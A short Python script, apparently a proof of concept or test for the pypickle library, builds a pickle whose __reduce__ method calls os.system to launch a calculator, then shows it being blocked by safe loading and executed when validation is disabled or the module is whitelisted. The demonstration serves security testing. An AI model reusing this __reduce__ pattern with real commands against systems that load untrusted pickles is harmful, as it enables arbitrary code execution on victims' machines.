import pypickle
import pickle
import os

class ExploitApp:
    def __reduce__(self):
        return (os.system, ("calc.exe",))  # Change to 'calc.exe' on Windows or "gnome-calculator" on Unix

filepath = 'exploit.pkl'
status = pypickle.save(filepath, ExploitApp(), overwrite=True)

# Safe load: should fail or return None
assert pypickle.load(filepath) is None

# Force load: should trigger the exploit
pypickle.load(filepath, validate=False)

# Or allow specific module, in this case we allow the exploit
mods = pypickle.validate_modules(filepath)
pypickle.load(filepath, validate=mods)
